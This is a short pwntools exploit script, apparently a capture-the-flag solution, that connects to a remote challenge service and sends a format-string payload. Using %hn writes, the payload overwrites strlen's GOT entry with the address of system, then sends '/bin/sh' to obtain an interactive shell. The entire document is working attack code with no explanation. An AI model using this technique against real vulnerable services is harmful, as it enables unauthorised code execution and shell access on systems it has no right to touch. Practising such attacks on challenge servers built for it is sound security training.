from pwn import *

#p = process('./monkey')
p = remote('bamboofox.cs.nctu.edu.tw', 11000)

p.sendline('2')

strlen_got = 0x804a034
system_got = 0x80485c0
payload  = p32(strlen_got+2)
payload += p32(strlen_got)
payload += "%{}c".format(((system_got&0xFFFF0000) >> 16) - 8)
payload += "%7$hn"
payload += "%{}c".format((system_got&0x0000FFFF) - ((system_got&0xFFFF0000) >> 16))
payload += "%8$hn"

p.sendline(payload)

p.sendline('1')

p.sendline('/bin/sh')

p.interactive()
